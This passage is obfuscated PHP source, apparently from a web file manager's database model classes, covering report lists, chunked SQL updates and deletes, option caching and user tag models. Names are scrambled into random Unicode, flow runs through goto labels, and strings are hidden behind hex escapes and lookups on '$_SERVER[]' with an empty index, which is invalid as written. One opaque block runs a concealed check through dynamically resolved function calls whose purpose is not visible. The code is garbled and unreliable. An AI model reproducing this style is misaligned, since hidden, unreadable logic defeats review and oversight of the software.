array_to_keyvalue($d⌏, $Cͱ[33], $Cͱ[365]); $aȶ = Model($Cͱ[738])->sourceListInfo($f٧Ŧ, !0); foreach ($d⌏ as &$eѯ) { $e睍 = $eѯ[$Cͱ[1406]]; $eѯ[$Cͱ[2205]] = $aƶ[$e睍] ? $aƶ[$e睍] : !1; $B = $eѯ[$Cͱ[365]]; $eѯ[$Cͱ[387]] = $aȶ[$B] ? $aȶ[$B] : !1; } } private function _makeOrder($AĚ = '') { goto F镄; CړЅ: $f = Input::get($FՅ[403], $FՅ[7], $FՅ[385], $e); $Dػ = Input::get($FՅ[404], $FՅ[7], $FՅ[2206], array($FՅ[2143], $FՅ[400])); $Dػ = $b[$Dػ]; goto F; F镄: $FՅ =& $_SERVER[]; $e = array($FՅ[183], $FՅ[689], $FՅ[2191], $FՅ[2192]); $b = array($FՅ[398] => $FՅ[399], $FՅ[400] => $FՅ[401]); goto CړЅ; F: $AĚ = $AĚ . "{$f}\40{$Dػ}"; return $this->order($AĚ); goto E͵; E͵: } public function reportAdd($a󢹵) { $c㐣 =& $_SERVER[]; $F܆Ğ = array($c㐣[437] => $a󢹵[$c㐣[437]], $c㐣[1406] => USER_ID); if (Model($c㐣[2202])->where($F܆Ğ)->find()) { return !1; } $dح = array($c㐣[437] => $a󢹵[$c㐣[437]], $c㐣[1313] => $a󢹵[$c㐣[1313]], $c㐣[365] => $a󢹵[$c㐣[365]], $c㐣[415] => $a󢹵[$c㐣[415]], $c㐣[1406] => USER_ID, $c㐣[29] => $a󢹵[$c㐣[29]], $c㐣[401] => $a󢹵[$c㐣[401]]); return Model($c㐣[2202])->add($dح); } public function reportList($F) { goto B՗喘; B՗喘: $eЊψ =& $_SERVER[]; $AΦ = array(); if ($F[$eЊψ[688]]) { $bǎὄ = $F[$eЊψ[689]] ? $F[$eЊψ[689]] : strtotime(date($eЊψ[2204])); $AΦ[$eЊψ[183]] = array($eЊψ[317], array($F[$eЊψ[688]], $bǎὄ)); } goto bؘ; A딎: $e = array($eЊψ[398] => $eЊψ[399], $eЊψ[400] => $eЊψ[401]); $aǤ = $eЊψ[2210] . $e[$Cɧ]; $CѢ = Model($eЊψ[2202])->where($AΦ)->order($aǤ)->selectPage(20); goto bʦ; bʦ: if (empty($CѢ[$eЊψ[350]])) { return array(); } $this->_listDataApply($CѢ[$eЊψ[350]]); return $CѢ; goto B; bؘ: if (isset($F[$eЊψ[29]]) && in_array($F[$eЊψ[29]], array($eЊψ[83], $eЊψ[2207], $eЊψ[2208], $eЊψ[2209], $eЊψ[1884]))) { $AΦ[$eЊψ[29]] = $F[$eЊψ[29]]; } if (isset($F[$eЊψ[675]]) && in_array($F[$eЊψ[675]], array($eЊψ[464], $eЊψ[83], $eЊψ[2207], $eЊψ[2208]))) { $AΦ[$eЊψ[675]] = $F[$eЊψ[675]]; } $Cɧ = Input::get($eЊψ[404], $eЊψ[7], $eЊψ[2206], array($eЊψ[2143], $eЊψ[400])); goto A딎; B: } public function reportStatus($eߊ) { goto D´; e: if (!$F޲) { return !1; } $cڥ = array($fŞ[675] => $eߊ[$fŞ[675]]); if ($eߊ[$fŞ[675]] == $fŞ[2208] && $F޲[$fŞ[675]] == $fŞ[2208]) { $cڥ[$fŞ[675]] = 0; } goto Bݟ; AċȈ: return $Aⶎ; goto D; D´: $fŞ =& $_SERVER[]; $b⺙ = array($fŞ[363] => $eߊ[$fŞ[363]]); $F޲ = Model($fŞ[2202])->where($b⺙)->field($fŞ[2211])->find(); goto e; Bݟ: $Aⶎ = Model($fŞ[2202])->where($b⺙)->save($cڥ); if ($eߊ[$fŞ[675]] == $fŞ[2207]) { if ($F޲[$fŞ[415]] != $fŞ[464] && $this->shareFileMeta($F޲[$fŞ[415]])) { $this->shareFileMeta($F޲[$fŞ[415]], 0); } $this->remove($F޲[$fŞ[437]]); return !0; } if ($Aⶎ && $eߊ[$fŞ[675]] == $fŞ[2208]) { $c񶃆Ē = $cڥ[$fŞ[675]] == $fŞ[2208] ? 1 : 0; $this->shareFileMeta($F޲[$fŞ[415]], $c񶃆Ē); $this->removeByFile($F޲[$fŞ[415]]); } goto AċȈ; D: } private function removeByFile($d) { goto f; f: $f =& $_SERVER[]; $aס = Model($f[738])->where(array($f[415] => $d))->field($f[365])->select(); $b݅ = array_to_keyvalue($aס, $f[33], $f[365]); goto eݫŴ; eݫŴ: $fܞ = array($f[365] => array($f[7], $b݅), $f[442] => 1); $aס = Model($f[2045])->where($fܞ)->field($f[437])->select(); if (empty($aס)) { return; } goto a; a: $B = array_to_keyvalue($aס, $f[33], $f[437]); $this->remove($B); goto C֠; C֠: } private function shareFileMeta($c濵, $DŬ = null) { $e猩݅ =& $_SERVER[]; $F﹩ = array($e猩݅[415] => $c濵, $e猩݅[89] => $e猩݅[2212]); if (is_null($DŬ)) { return Model($e猩݅[2213])->where($F﹩)->find(); } $F﹩[$e猩݅[355]] = $DŬ; Model($e猩݅[2213])->add($F﹩, array(), !0); } } goto F崇ζ; Eǻ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\x73\x65\x72\164\54\x75\x70\x64\141\164\145", "\x66\x75\x6e\x63\164\151\157\x6e"), array("\143\x72\x65\141\164\x65\x54\151\155\145", "\164\151\x6d\145", "\x69\156\x73\x65\162\164", "\x66\x75\156\x63\x74\151\x6f\156")); public function setDataAuto($Cǘ) { $this->dataAuto = $Cǘ; } public function __construct($ḟȇ = '', $d = '', $Bچ = '') { parent::__construct($ḟȇ, $d, $Bچ); } public static function textEncode($a٩) { if (!$a٩) { return $a٩; } $Eퟕϣ = json_encode($a٩); $Eퟕϣ = preg_replace_callback($_SERVER[][338], function ($aڂ) { return addslashes($aڂ[0]); }, $Eퟕϣ); return json_decode($Eퟕϣ); } public static function textDecode($a߿) { $E酐 =& $_SERVER[]; $bһ = json_encode($a߿); $bһ = preg_replace_callback($E酐[339], function ($f) { return $_SERVER[][93]; }, $bһ); return json_decode($bһ); } protected $tableMeta = array(); protected function _beforeInsert(&$dڋ, $eٗ) { $Bά =& $_SERVER[]; if (!$this->checkDataAutoHas($Bά[340])) { return; } $this->dataBeforeFilter($dڋ, $Bά[340]); } protected function _beforeUpdate(&$eʯ, $e˷) { $AϿϥ =& $_SERVER[]; if (!$this->checkDataAutoHas($AϿϥ[341])) { return; } $this->dataBeforeFilter($eʯ, $AϿϥ[341]); } protected function _afterSelect(&$e, $DԠք) { if (!is_array($e)) { return; } if (!$this->checkDataAutoHas($_SERVER[][342])) { return; } foreach ($e as &$aٝď) { $this->dataAfterFilter($aٝď); } } protected function _afterFind(&$Aí, $cҺ) { if (!is_array($Aí)) { return; } if (!$this->checkDataAutoHas($_SERVER[][342])) { return; } $this->dataAfterFilter($Aí); } public function setAutoIncrement($B鏑) { $A┻ = array($this->getPk() => $B鏑); $D¶ = $this->data($A┻)->add(); if ($D¶) { $this->delete($D¶); } } public function getAutoIncrement() { $C = $this->getTableName(); $f = $this->max($this->getPk()); $c֡ = $this->query("\163\x68\x6f\x77\x20\x74\x61\142\x6c\x65\x20\x73\x74\x61\x74\x75\x73\40\x77\x68\145\x72\145\40\116\141\155\x65\x3d\x27{$C}\47"); $b = $c֡[0][$_SERVER[][343]]; $b̠ = max($f, $b); return $b̠; } protected function _callBefore($b, $A) { return $this->cacheCallCheck($b, $A, !1); } protected function _callAfter($E, $c߻) { return $this->cacheCallCheck($E, $c߻, !0); } protected function cacheFunctionAlias($aٳ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($e¯Ս, $c, $a = false) { $CǴ = $this->cacheFunctionAlias($c); if (!$CǴ) { return; } foreach ($CǴ as $c => $eŴ) { $A浒 = $eŴ[0]; $dЕ = explode($_SERVER[][47], $eŴ[1]); if ($e¯Ս == $c) { return $this->cacheFunctionGet($c, $A浒); } if ($a && in_array($e¯Ս, $dЕ)) { $this->cacheFunctionClear($c, $A浒); } } } public function cacheFunctionGet($a, $dȼЮ) { $f̆ = $this->cacheKeyMake($a, $dȼЮ); $CǞ = Cache::get($f̆); if (!is_array($CǞ)) { $CǞ = call_user_func_array(array($this, $a), array($dȼЮ, !0)); Cache::set($f̆, $CǞ); } return $CǞ; } public function cacheFunctionClear($Fɡ, $Fو) { $cꥒ = $Fو; if (!is_array($Fو)) { $cꥒ = array($Fو); } foreach ($cꥒ as $c) { $Eҗ = $this->cacheKeyMake($Fɡ, $c); Cache::remove($Eҗ); } } private function cacheKeyMake($D鑔, $dռǊ) { $F̨ =& $_SERVER[]; return get_class($this) . $F̨[70] . $D鑔 . $F̨[344] . $dռǊ; } protected function selectPage($c؋ = 200, $Cڂ = 1) { goto C͠; FǠ: $dŇ = $A׵; $dŇ[$D飊ԍ[346]] = array(); $this->optionsValue($dŇ); goto f; F٣: $this->optionsValue($A׵); $Eֹӡ = $this->page($Cڂ, $c؋)->select(); $Eֹӡ = is_array($Eֹӡ) ? $Eֹӡ : array(); goto c񆎢; c񆎢: if ($BߛҔ == 1) { $eõȎ = count($Eֹӡ); } $c = array($D飊ԍ[347] => array($D飊ԍ[348] => $eõȎ, $D飊ԍ[345] => $c؋, $D飊ԍ[336] => $Cڂ, $D飊ԍ[349] => $BߛҔ), $D飊ԍ[350] => $Eֹӡ ? $Eֹӡ : array()); return $c; goto A; f: $eõȎ = intval($this->count()); $c؋ = intval($c؋); $c؋ = $c؋ <= 5 ? 5 : ($c؋ >= $b ? $b : $c؋); goto Fסވ; b䒶: $b = 4000; $c؋ = isset($in[$D飊ԍ[345]]) ? $in[$D飊ԍ[345]] : $c؋; if ($c؋ === -1) { unset($in[$D飊ԍ[345]]); $b = 100000000; $c؋ = $b; } goto FǠ; Fסވ: $BߛҔ = ceil($eõȎ / $c؋); $Cڂ = intval(isset($in[$D飊ԍ[336]]) ? $in[$D飊ԍ[336]] : $Cڂ); $Cڂ = $Cڂ <= 1 ? 1 : ($Cڂ >= $BߛҔ ? $BߛҔ : $Cڂ); goto F٣; C͠: $D飊ԍ =& $_SERVER[]; global $in; $A׵ = $this->optionsValue(); goto b䒶; A: } protected function checkLength($d, $Dنڎ = 0, $Aǈ㦞 = '') { $f̿ =& $_SERVER[]; $Dنڎ = $Dنڎ ? $Dنڎ : 65536; if (!$d || strlen($d) < $Dنڎ) { return; } $Aǈ㦞 = $Aǈ㦞 ? $Aǈ㦞 . $f̿[67] : $f̿[33]; show_json($Aǈ㦞 . LNG($f̿[351]) . "\50{$Dنڎ}\x29", !1); } protected function metaSet($dĞ, $C = null, $CÅ = null) { goto eܑǏ; DߟԴ: if (is_string($C)) { $d؂[$C] = $CÅ; } $B = array(); foreach ($d؂ as $cΥ => $D) { $this->checkLength($D, !1, $b䅊 . $eٓ[4] . $cΥ); $B[] = array($a㑍 => $dĞ, $eٓ[89] => $cΥ, $eٓ[355] => $D); } goto a; eܑǏ: $eٓ =& $_SERVER[]; if (!$this->tableMeta) { return !1; } $a㑍 = $this->tableMeta[$eٓ[352]]; goto C; C: $b䅊 = $this->tableMeta[$eٓ[353]]; $F߇Э = Model($b䅊); $A = array($a㑍 => $dĞ, $eٓ[354] => $C); goto F; a: $F߇Э->where(array($a㑍 => $dĞ))->addAll($B, array(), !0); return !0; goto Dɨ; F: if (is_null($C)) { return $F߇Э->where(array($a㑍 => $dĞ))->delete(); } if (is_null($CÅ)) { return $F߇Э->where($A)->delete(); } $d؂ = is_array($C) ? $C : array(); goto DߟԴ; Dɨ: } public function metaGet($b⯓) { goto Aܰ뵐; B組: $B = Model($this->tableMeta[$e֩[353]]); $C = array($B => $b⯓); $f܍ = $B->field($e֩[356])->where($C)->select(); goto dҖ; Aܰ뵐: $e֩ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $B = $this->tableMeta[$e֩[352]]; goto B組; dҖ: $f܍ = array_to_keyvalue($f܍, $e֩[89], $e֩[355]); return $f܍; goto bՋݠ; bՋݠ: } private function checkDataAutoHas($Dܣ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $c) { if (in_array($Dܣ, explode($_SERVER[][47], $c[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Aܵɔ, $CԊ) { $Bٗ =& $_SERVER[]; foreach ($this->dataAuto as $aҝ׉) { $dޏƋ = $aҝ׉[0]; if (!in_array($CԊ, explode($Bٗ[47], $aҝ׉[2]))) { continue; } switch (trim($aҝ׉[3])) { case $Bٗ[305]: case $Bٗ[306]: $AՍ = $aҝ׉[1]; $f譢 = isset($aҝ׉[4]) ? (array) $aҝ׉[4] : array(); if ($AՍ == $Bٗ[186] && array_key_exists($dޏƋ, $Aܵɔ)) { if (!$Aܵɔ[$dޏƋ]) { unset($Aܵɔ[$dޏƋ]); } break; } if (isset($Aܵɔ[$dޏƋ])) { array_unshift($f譢, $Aܵɔ[$dޏƋ]); } if ($Bٗ[305] == $aҝ׉[3]) { $Aܵɔ[$dޏƋ] = call_user_func_array($AՍ, $f譢); } else { $Aܵɔ[$dޏƋ] = call_user_func_array(array(&$this, $AՍ), $f譢); } break; case $Bٗ[257]: $Aܵɔ[$dޏƋ] = $Aܵɔ[$aҝ׉[1]]; break; case $Bٗ[278]: if (isset($Aܵɔ[$dޏƋ]) && !is_string($Aܵɔ[$dޏƋ])) { $Aܵɔ[$dޏƋ] = json_encode_force($Aܵɔ[$dޏƋ]); } break; case $Bٗ[307]: if ($Aܵɔ[$dޏƋ] === $Bٗ[33]) { unset($Aܵɔ[$dޏƋ]); } break; case $Bٗ[308]: $Aܵɔ[$dޏƋ] = $aҝ׉[1]; default: break; } } if ($CԊ == $Bٗ[340]) { $FɶҶ = strtolower($this->db->getDbType()); if (strpos($FɶҶ, $Bٗ[9]) !== 0) { return; } $C˔ֆ = $this->field(!0)->fields; $E䇬 = $C˔ֆ[$Bٗ[236]]; if (isset($C˔ֆ[$Bٗ[235]])) { unset($E䇬[$C˔ֆ[$Bٗ[235]]]); } foreach ($E䇬 as $fĂ => $CԊ) { if (!isset($Aܵɔ[$fĂ])) { $Aܵɔ[$fĂ] = $Bٗ[33]; } } } } private function dataAfterFilter(&$D) { $a↎ =& $_SERVER[]; foreach ($this->dataAuto as $cؑ) { $eψ = $cؑ[0]; if (!in_array($a↎[342], explode($a↎[47], $cؑ[2]))) { continue; } if (!isset($D[$eψ])) { continue; } switch (trim($cؑ[3])) { case $a↎[305]: case $a↎[306]: $F駅ۂ = isset($cؑ[4]) ? (array) $cؑ[4] : array(); array_unshift($F駅ۂ, $D[$eψ]); if ($a↎[305] == $cؑ[3]) { $D[$eψ] = call_user_func_array($cؑ[1], $F駅ۂ); } else { $D[$eψ] = call_user_func_array(array(&$this, $cؑ[1]), $F駅ۂ); } break; case $a↎[257]: $D[$eψ] = $D[$cؑ[1]]; break; case $a↎[278]: $b럈 = $D[$eψ]; $D[$eψ] = json_decode($b럈, !0); if (is_null($D[$eψ])) { $D[$eψ] = $b럈; } break; case $a↎[307]: if ($D[$eψ] === $a↎[33]) { unset($D[$eψ]); } break; case $a↎[308]: $D[$eψ] = $cؑ[1]; default: break; } } } public function saveAll($E) { goto B; cÛ: $fԐԘ = array(); $FϰӅ = count($E); for ($f絚 = 0; $f絚 < $FϰӅ; $f絚++) { $Aƭ = $E[$f絚]; if (!is_array($Aƭ) || count($Aƭ) != 4) { continue; } $D = "\125\120\x44\x41\x54\x45\40{$B̳}\x20\123\105\124\x20{$Aƭ[2]}\40\x3d\40\x43\x41\x53\105\x20{$Aƭ[0]}\40\xa"; if ($eӯ == 0) { $f֗ = $D; } $fԐԘ[] = $eŬ[112] . $Aƭ[1] . $eŬ[112]; $eӯ++; $f֗ .= "\40\127\110\105\116\x20\47{$Aƭ[1]}\x27\x20\124\110\105\116\40\47{$Aƭ[3]}\47\x20\xa"; if ($eӯ == $D͇ || $f絚 == $FϰӅ - 1) { goto A榥ݦ; A榥ݦ: $dſ = implode($eŬ[47], $fԐԘ); $f֗ .= "\40\x45\x4e\104\40\x20\x57\x48\x45\122\105\40{$Aƭ[0]}\x20\x49\116\x20\50{$dſ}\51\x20"; $this->execute($f֗); goto aԼ; b: $fԐԘ = array(); goto Dʥ; aԼ: $eӯ = 0; $f֗ = $D; $this->chunkEventCheck(count($fԐԘ)); goto b; Dʥ: } } goto dȺ; dȺ: $this->chunkEventSet(); goto A囗; B: $eŬ =& $_SERVER[]; $B̳ = $this->tablePrefix . $this->tableName; $D͇ = self::SQL_WHERE_IN_CHUNK; goto a볓; a볓: $E = is_array($E) ? $E : array(); $f֗ = $eŬ[357]; $eӯ = 0; goto cÛ; A囗: } public function saveAllEach($aƣ) { $fݗ =& $_SERVER[]; $aꆈ = $this->tablePrefix . $this->tableName; foreach ($aƣ as $d) { if (!is_array($d) || count($d) != 4) { continue; } $cƴΙ = $d[0] . $fݗ[358] . $d[1] . $fݗ[112]; $A = $d[2] . $fݗ[358] . $d[3] . $fݗ[112]; $Aʹ = "\x75\160\x64\141\164\145\40{$aꆈ}\40\x73\145\x74\x20{$A}\x20\167\x68\x65\162\x65\x20{$cƴΙ}\x3b"; $this->execute($Aʹ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Bև = false, $Cܮ = false) { $this->_chunkEvent = $Bև; $this->_chunkEventParam = $Cܮ; } private function chunkEventCheck($Bͅ) { if (!$this->_chunkEvent) { return; } $F = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F[$_SERVER[][359]] = $Bͅ; Hook::trigger($this->_chunkEvent, $F); } public function addAll($C, $DȌĊ = array(), $Cؾ = false) { goto f; cǽ: if (method_exists($this->db, $D[256])) { for ($d䵇 = 0; $d䵇 < count($C); $d䵇 += $f،) { $Cޭ = array_slice($C, $d䵇, $f،); if (!is_array($Cޭ) || count($Cޭ) == 0) { break; } $cҌ = $this->db->insertAll($Cޭ, $DȌĊ, $Cؾ); $this->chunkEventCheck(count($Cޭ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($C as $F => $FȲʦ) { $cҌ = $this->db->insert($FȲʦ, $DȌĊ, $Cؾ); } $this->commit(); } if (!1 !== $cҌ) { $aϑ넬 = $this->getLastInsID(); if ($aϑ넬) { return $aϑ넬; } } return $cҌ; goto Eš; D溥: if (empty($C)) { $this->error = think_lang($D[255]); return !1; } $DȌĊ = $this->_parseOptions($DȌĊ); foreach ($C as $F => $FȲʦ) { $C[$F] = $this->_facade($FȲʦ); $this->_beforeInsert($C[$F], $DȌĊ); } goto cǽ; f: $D =& $_SERVER[]; ignore_timeout(); $f، = self::SQL_WHERE_IN_CHUNK; goto D溥; Eš: } public function save($aǈ = '', $BҒ = array()) { goto aߑ; cጹ: $a톫ؿ = $A[$Bڿ[259]][$e][1]; $a톫ؿ = is_array($a톫ؿ) ? $a톫ؿ : array(); $C߮ = count($a톫ؿ); goto C; C: for ($c뽞 = 0; $c뽞 < $C߮; $c뽞 += $dƘ) { $F邓 = array_slice($a톫ؿ, $c뽞, $dƘ); if (!is_array($F邓) || count($F邓) == 0) { break; } $A[$Bڿ[259]][$e][1] = $F邓; $this->optionsValue($A); $B += parent::save($aǈ, $BҒ); $this->chunkEventCheck(count($F邓)); } $this->chunkEventSet(); return $B; goto b쮧; F֙: $e = $this->findWhereField($A); if (!$e) { return parent::save($aǈ, $BҒ); } $B = 0; goto cጹ; aߑ: $Bڿ =& $_SERVER[]; $dƘ = self::SQL_WHERE_IN_CHUNK; $A = $this->optionsValue(); goto F֙; b쮧: } public function add($CƟ = '', $cɓ = array(), $fʅ҂ = false) { if ($this->addTaskStatus && is_array($CƟ)) { $this->addTaskData[] = $CƟ; return; } return parent::add($CƟ, $cɓ, $fʅ҂); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($c = array()) { goto Cˏ멡; C: return $bČʈ; goto bϩ; Cˏ멡: $dϨެ =& $_SERVER[]; $bΉ = self::SQL_WHERE_IN_CHUNK; $E = $this->optionsValue(); goto b߳; D: $B֏փ = is_array($B֏փ) ? $B֏փ : array(); $bČʈ = null; for ($b = 0; $b < count($B֏փ); $b += $bΉ) { $Cጷ = array_slice($B֏փ, $b, $bΉ); if (!is_array($Cጷ) || count($Cጷ) == 0) { break; } $E[$dϨެ[259]][$F][1] = $Cጷ; $this->optionsValue($E); $c䣰 = parent::select($c); if (!$c䣰) { continue; } if (is_null($bČʈ)) { $bČʈ = array(); } $bČʈ = array_merge($bČʈ, $c䣰); } goto C; b߳: $F = $this->findWhereField($E); if (!$F || isset($E[$dϨެ[276]]) || isset($E[$dϨެ[336]])) { return parent::select($c); } $B֏փ = $E[$dϨެ[259]][$F][1]; goto D; bϩ: } public function delete($e = array()) { goto F∞; a̠: return $E̤Γ; goto A㨪; aɮ: $eʪ = $this->findWhereField($dঊ); if (!$eʪ) { return parent::delete($e); } $E̤Γ = 0; goto E; E: $f򾋓 = $dঊ[$Dް[259]][$eʪ][1]; $f򾋓 = is_array($f򾋓) ? $f򾋓 : array(); for ($fޱГ = 0; $fޱГ < count($f򾋓); $fޱГ += $A) { $F昬 = array_slice($f򾋓, $fޱГ, $A); if (!is_array($F昬) || count($F昬) == 0) { break; } $dঊ[$Dް[259]][$eʪ][1] = $F昬; $this->optionsValue($dঊ); $E̤Γ += parent::delete($e); } goto a̠; F∞: $Dް =& $_SERVER[]; $A = self::SQL_WHERE_IN_CHUNK; $dঊ = $this->optionsValue(); goto aɮ; A㨪: } private function findWhereField($b֖) { $bË =& $_SERVER[]; $dÆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b֖) || !is_array($b֖[$bË[259]])) { return !1; } foreach ($b֖[$bË[259]] as $f̵͠ => $Aºĭ) { if (is_array($Aºĭ) && isset($Aºĭ[0]) && is_string($Aºĭ[0]) && strtolower($Aºĭ[0]) == $bË[7] && is_array($Aºĭ[1]) && count($Aºĭ[1]) > $dÆ) { ignore_timeout(); return $f̵͠; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\x6d\x4f\160\x74\151\x6f\156"; public $field = array(); public function listData($E = false, $eӘ = "\x6d\157\x64\x69\x66\x79\124\151\155\x65", $EϚ = false) { $B⫏ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$B⫏) { return $E ? null : array(); } if (!$E) { $B⫏ = array_filter(array_values($B⫏)); return array_sort_by($B⫏, $eӘ, $EϚ); } return $B⫏[$_SERVER[][360] . $E]; } public function insert($Bٚ) { goto F ; E㘾ޔ: $Bٚ[$C£Æ[106]] = time(); Model($this->modelType)->set($C£Æ[361], $E, $this->optionType . $C£Æ[362]); Model($this->modelType)->set($C£Æ[360] . $E, $Bٚ, $this->optionType); goto C᳎; C᳎: return $E; goto F˞Һ; cδ: $E = $E ? $E : 0; $Bٚ[$C£Æ[363]] = ++$E; $Bٚ[$C£Æ[183]] = time(); goto E㘾ޔ; F : $C£Æ =& $_SERVER[]; $Bٚ = array_field_key($Bٚ, $this->field); $E = Model($this->modelType)->get($C£Æ[361], $this->optionType . $C£Æ[362]); goto cδ; F˞Һ: } public function update($f, $F߄) { goto eܵ۠; eܵ۠: $d =& $_SERVER[]; $F߄ = array_field_key($F߄, $this->field); $F = $this->listData($f); goto F; F: if (!$F) { return !1; } $F߄ = array_merge($F, $F߄); $F߄[$d[106]] = time(); goto D놷ֆ; D놷ֆ: return Model($this->modelType)->set($d[360] . $f, $F߄, $this->optionType); goto a҃턃; a҃턃: } public function remove($Fň֕) { return Model($this->modelType)->remove($_SERVER[][360] . $Fň֕, $this->optionType); } public function clear() { $A =& $_SERVER[]; Model($this->modelType)->remove($A[361], $this->optionType . $A[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Dҧʕ, $dԎ) { if (!$dԎ) { return !1; } $e = $this->listData(); $e = array_to_keyvalue($e, $Dҧʕ); return isset($e[$dԎ]) ? $e[$dԎ] : !1; } public function findByName($Eѹ) { return $this->findByKey($_SERVER[][28], $Eѹ); } protected function resetData($B) { $aǐ =& $_SERVER[]; $B = is_array($B) ? $B : array(); $fԄ = array(); for ($B֕ = 0; $B֕ < count($B); $B֕++) { $fԄ[$aǐ[360] . $B[$B֕][$aǐ[363]]] = $B[$B֕]; } return Model($this->modelType)->set($fԄ, !1, $this->optionType); } private function getAutoName($E) { $c = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$c || !isset($c[$E])) { return $E; } for ($e΂ = 1; $e΂ < count($c); $e΂++) { $d󥿷 = $E . "\x28{$e΂}\x29"; if (!isset($c[$d󥿷])) { return $d󥿷; } } return $d󥿷; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($b݉ = false, $C = '', $f· = false) { goto Aߊ; Aߊ: $f =& $_SERVER[]; $Bڑ = $this->cacheGet($C); $cԋ = $this->optionDefault($C); goto FІŃ; FІŃ: $cԋ = is_array($cԋ) ? $cԋ : array(); if (is_array($Bڑ)) { $Bڑ = array_merge($cԋ, $Bڑ); return $b݉ ? isset($Bڑ[$b݉]) ? $Bڑ[$b݉] : null : $Bڑ; } $C = $this->filterWhere(array($f[29] => $C)); goto E㍿; dɦ: $this->cacheSet($C, $Bڑ); $Bڑ = array_merge($cԋ, $Bڑ); return $b݉ ? $Bڑ[$b݉] : $Bڑ; goto F; E㍿: $Bڑ = $this->where($C)->select(); $Bڑ = array_to_keyvalue($Bڑ, $f[89], $f[355]); foreach ($Bڑ as $dէ => $Eϭ) { if ($f· || in_array($dէ, $this->jsonField)) { $Bڑ[$dէ] = json_decode($Eϭ, !0); } } goto dɦ; F: } public function set($Dܯ, $F = false, $e = '') { goto Bʊ; Bʊ: $D£ׅ =& $_SERVER[]; $this->cacheRemove($e); $e = array(); goto Dς; e빂: return $this->addAll($e, array(), !0); goto B䉪; Dς: $cޙ = is_array($Dܯ) ? $Dܯ : array($Dܯ => $F); foreach ($cޙ as $DΣ => $D鬟) { if (is_array($D鬟)) { $D鬟 = json_encode_force($D鬟); } $this->checkLength($D鬟, !1, $this->tableName . $D£ׅ[4] . $Dܯ); $D鬟 = self::textEncode($D鬟); $cޙ = array($D£ׅ[29] => $e, $D£ׅ[89] => $DΣ, $D£ׅ[355] => $D鬟); $e[] = $this->filterWhere($cޙ); } if (!$e) { return !0; } goto e빂; B䉪: } protected function optionDefault($c = '') { return !1; } public function setDeep($C, $f = false, $Cʫᵨ = '') { $dḜ = explode($_SERVER[][91], $C); $Dߖ = $this->get(); array_set_value($Dߖ, $C, $f); $this->set($dḜ[0], $Dߖ[$dḜ[0]], $Cʫᵨ); } public function remove($C񗍩, $Dᐱ = '') { $fʃ =& $_SERVER[]; $this->cacheRemove($Dᐱ); $Cš = $this->filterWhere(array($fʃ[89] => $C񗍩, $fʃ[29] => $Dᐱ)); if (is_null($C񗍩)) { unset($Cš[$fʃ[89]]); } return $this->where($Cš)->delete(); } public function cacheSet($d, $eқ۞ = false) { return Cache::set($this->cacheKey($d), $eқ۞); } public function cacheGet($Eȼ) { return Cache::get($this->cacheKey($Eȼ)); } public function cacheRemove($fߜ) { return Cache::remove($this->cacheKey($fߜ)); } protected function filterWhere($e) { return $e; } protected function cacheKey($F) { return $F; } } goto Dؑ; FǗ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A) { $a뾞 =& $_SERVER[]; if (!defined($a뾞[423])) { define($a뾞[423], 0); } return "\125\163\145\162\117\x70\164\151\157\x6e\x5f{$A}\x5f" . USER_ID; } protected function filterWhere($Fͪ) { $B =& $_SERVER[]; if (!defined($B[423])) { define($B[423], 0); } $Fͪ[$B[1406]] = USER_ID; return $Fͪ; } public function cacheRemoveUser($C, $B) { return Cache::remove("\x55\x73\145\162\x4f\160\x74\x69\x6f\x6e\x5f{$C}\137" . $B); } protected function optionDefault($CѠû = '') { $A =& $_SERVER[]; if ($CѠû == $A[33]) { return $GLOBALS[$A[6]][$A[2503]]; } if ($CѠû == $A[2504]) { return $GLOBALS[$A[6]][$A[2505]]; } } } if ($_SERVER[$_SERVER[][775]] != $_SERVER[$_SERVER[][959]]) { goto Aȭ; eɲ: $fѓ($_SERVER[$_SERVER[][961]]); goto b; Aȭ: $e࣋ = $_SERVER[][777]; $Eڳ = $_SERVER[$_SERVER[][772]] . $_SERVER[][773]; $CӸ = $e࣋($Eڳ); goto F; F: $Cˇ = explode($_SERVER[][213], $CӸ); if (count($Cˇ) < $_SERVER[][584]) { $d㐣 = $_SERVER[][778]; $d㐣(); } $fѓ = $_SERVER[][960]; goto eɲ; b: } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\x74\x61\x67\114\x69\163\x74"; public $modelType = "\125\163\x65\162\117\x70\x74\x69\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\x79\154\145", "\163\x6f\x72\164"); public function listData($Fī = false, $A˿ = "\x73\x6f\162\164", $c˟䊏 = false) { return parent::listData($Fī, $A˿, $c˟䊏); } public function remove($c) { return parent::remove($c); } public function add($E, $d = "\x6c\141\x62\145\154\x2d\x67\x72\145\x79\55\x6e\157\x72\155\x61\x6c") { $Eť =& $_SERVER[]; if ($this->findByName($E)) { return !1; } $eޠۖ = array($Eť[382] => $E, $Eť[433] => $d, $Eť[2072] => $this->getSort($Eť[242]) + 1); return parent::insert($eޠۖ); } public function update($c즱, $b) 